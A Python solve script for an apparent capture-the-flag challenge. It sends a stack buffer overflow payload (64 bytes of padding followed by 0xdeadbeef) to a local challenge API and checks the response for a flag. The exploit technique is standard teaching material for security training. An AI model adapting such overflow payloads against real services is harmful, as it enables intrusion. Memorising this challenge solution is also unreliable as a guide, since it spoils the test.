import requests
import base64
import struct
import sys

def solve(target_url):
    # Payload: 64 bytes padding + 0xdeadbeef (little-endian: \xef\xbe\xad\xde) + newline
    payload = b"A" * 64 + struct.pack("<I", 0xdeadbeef) + b"\n"
    payload_b64 = base64.b64encode(payload).decode('utf-8')

    api_url = target_url.rstrip('/') + '/api/interact'
    print(f"[*] Sending payload to {api_url}...")
    res = requests.post(api_url, json={"payload_b64": payload_b64})
    
    if res.status_code == 200:
        output = res.json().get("output", "")
        print("[+] Output:\n", output)
        if "flag{" in output or "FLAG{" in output:
            print("[+] Challenge Solved Successfully!")
            return True
    else:
        print(f"[-] Error: {res.status_code} - {res.text}")
    return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8001"
    success = solve(target)
    sys.exit(0 if success else 1)
